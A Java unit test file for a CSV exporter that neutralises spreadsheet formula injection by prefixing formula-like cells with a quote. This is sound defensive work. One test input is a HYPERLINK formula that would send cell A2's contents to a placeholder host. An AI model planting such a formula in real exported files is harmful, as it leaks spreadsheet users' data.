package com.mrcdprm.dataviz.ui;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** CSV dışa aktarma: Excel'in formül olarak çalıştıracağı hücreler metne çevrilir, sayılar olduğu gibi kalır. */
class ExporterTest {

    @AfterEach
    void restoreLanguage() {
        I18n.setLocale(I18n.TR);
    }

    @Test
    void textStartingWithAFormulaCharacterGetsAQuotePrefix() {
        assertEquals("'=1+1", Exporter.cell("=1+1", ';'));
        assertEquals("'+90 532 000 00 00", Exporter.cell("+90 532 000 00 00", ';'));
        assertEquals("'-5 derece", Exporter.cell("-5 derece", ';'));
        assertEquals("'@SUM(A1:A3)", Exporter.cell("@SUM(A1:A3)", ';'));
        assertEquals("'\t=1+1", Exporter.cell("\t=1+1", ';'));
        assertEquals("\"'\r=1+1\"", Exporter.cell("\r=1+1", ';'));
    }

    @Test
    void numbersAreLeftAlone() {
        for (String number : List.of("-5", "-12,75", "-12.75", "+3", "0", "1234"))
            assertEquals(number, Exporter.cell(number, ';'));
    }

    @Test
    void numbersWrittenByTheExporterNeverGetAPrefix() {
        // plain() binlik ayırıcı yazmaz; yazsaydı "-1.234,5" sayı sayılmayıp tırnak alırdı
        for (var locale : List.of(I18n.TR, I18n.EN)) {
            I18n.setLocale(locale);
            for (double v : new double[] {-1234.5, -0.000001, -1e9, 42})
                assertEquals(Exporter.plain(v), Exporter.cell(Exporter.plain(v), ';'));
        }
    }

    @Test
    void thePrefixGoesInsideTheCsvQuotes() {
        assertEquals("\"'=HYPERLINK(\"\"https://ornek.com/?d=\"\"&A2;\"\"Tıkla\"\")\"",
                Exporter.cell("=HYPERLINK(\"https://ornek.com/?d=\"&A2;\"Tıkla\")", ';'));
    }

    @Test
    void plainTextAndEmptyCells() {
        assertEquals("Ankara", Exporter.cell("Ankara", ';'));
        assertEquals("\"a;b\"", Exporter.cell("a;b", ';'));
        assertEquals("a;b", Exporter.cell("a;b", ','));
        assertEquals("", Exporter.cell("", ';'));
        assertEquals("", Exporter.cell(null, ';'));
    }

    @Test
    void fileHasABomAndTheLanguagesDelimiter(@TempDir Path dir) throws Exception {
        final List<List<String>> rows = List.of(List.of("Şehir", "Değer"), List.of("=kötü", "-3,5"));

        Path tr = dir.resolve("tr.csv");
        Exporter.csv(rows, tr);
        String text = Files.readString(tr, StandardCharsets.UTF_8);
        assertTrue(text.startsWith("﻿"));
        assertEquals("﻿Şehir;Değer\r\n'=kötü;-3,5\r\n", text);

        I18n.setLocale(I18n.EN);
        Path en = dir.resolve("en.csv");
        Exporter.csv(List.of(List.of("City", "Value"), List.of("=bad", "-3.5")), en);
        assertEquals("﻿City,Value\r\n'=bad,-3.5\r\n", Files.readString(en, StandardCharsets.UTF_8));
    }
}
